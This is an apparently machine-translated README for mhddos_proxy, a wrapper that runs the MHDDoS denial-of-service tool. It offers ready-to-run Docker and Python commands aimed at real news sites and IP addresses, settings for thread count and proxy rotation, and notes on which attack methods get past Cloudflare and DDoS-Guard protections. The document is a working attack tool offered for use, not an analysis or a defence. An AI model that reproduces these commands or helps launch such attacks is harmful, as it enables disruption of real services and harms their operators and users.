Wrapper script to run the powerful DDoS tool [MHDDoS] (https://github.com/MHProDev/MHDDoS).

- ** Does not require VPN ** - downloads and selects working proxies for the attack (available mode `--vpn` optional)
- Attack ** multiple targets ** with automatic load balancing
- Uses ** various methods to attack **

### ⏱ Recent updates

- ** 03.04.2022 ** Fixed bug Too many open files (thanks, @ kobzar-darmogray and @ euclid-catoptrics)
- ** 02.04.2022 ** Workflows are no longer restarted for each cycle, but are reused. Ctrl-C has also been fixed
- ** 01.04.2022 ** Updated CFB method in accordance with MHDDoS. [See notes below] (# - warning-about-some-attack-methods)
- ** 31.03.2022 ** Added reliable DNS servers for target resolving, instead of system. (1.1.1.1, 8.8.8.8 etc.)

<details>
  <summary> 📜 Previous </summary>

- ** 29.03.2022 ** Added support for local configuration file (thank you very much, @ kobzar-darmogray).
- ** 28.03.2022 ** Added tabular output `--table` (thank you very much, @ alexneo2003).
- ** 27.03.2022 **
    - DBG, BOMB (thanks @ drew-kun for PR) and KILLER methods are allowed to run to match the original MHDDoS.
- ** 26.03.2022 **
    - Launch all selected attacks instead of random
    - Reduced RAM usage on a large number of targets - now only the `-t` parameter affects RAM
    - Added DNS caching and correct handling of resolving problems
- ** 25.03.2022 ** Added VPN mode instead of proxy (`--vpn` checkbox)
- ** 25.03.2022 ** MHDDoS included in the repository for greater control over the development and protection against unexpected
  changes
</details>

### 💽 Installation | Installation - [instructions HERE] (/ docs / installation.md)

### 🕹 Run | Running (different goal options are given)

#### Docker

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp: //194.54.14.131: 4477

#### Python (if it doesn't work - just python instead of python3)

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp: //194.54.14.131: 4477

### 🛠 Settings (more in [CLI] (# cli))

** All parameters can be combined **, you can specify both before and after the list of goals

Change load - `-t XXXX` - number of threads, default - CPU * 1000

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru

To view information about the progress of the attack, add the `--table` check box for the table,` --debug` for the text

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru

### 🐳 Community
- [Detailed analysis of MHDDoS_proxy] (https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md)
- [Utility for converting shared targets into config format] (https://github.com/kobzar-darmogray/mhddos_proxy_utils)
- [Analysis of the tool mhddos_proxy] (https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)

### 🚨 Warning about some attack methods
The ** BYPASS ** method is a slow version of the GET method, which has questionable effectiveness due to the lack of a noticeable implementation of security bypass.

** CFB ** method - can bypass only a small part of the protection of some sites, full implementation requires a CAPTCHA solution,
and access to a paid version of the library that cannot be included in mhddos_proxy (open source).
** DGB ** method - successful requests do not depend on the implementation itself (it does not work), but on the "purity" of the IP address.
There is currently no reliable open-source implementation of Cloudflare and DDoS-Guard workarounds.
Finding the original target servers or attacking by default will be more effective.

The ** BOMB ** method requires much more RAM - reduce the value of `-t`.
Also needs additional settings when running via python - please contact
to [MHDDoS documentation] (https://github.com/MHProDev/MHDDoS).

The ** KILLER ** method can have unpredictable consequences for your system - use at your own risk.

### CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-p PERIOD]
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--rpc RPC] 
                     [--proxy-timeout TIMEOUT]
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL to remote or path to local config file (list of targets in plain text)
      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
      -p, --period 900       How often to update the proxies (default is 900)
      --table                Print log as table
      --debug                Print log as text
      --vpn                  Disable proxies to use VPN
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --proxy-timeout 5      How many seconds to wait for the proxy to make a connection (default is 5)
      --http-methods GET     List of HTTP(s) attack methods to use.
                             (default is GET, POST, STRESS, BOT, PPS)
                             Refer to MHDDoS docs for available options
                             (https://github.com/MHProDev/MHDDoS)
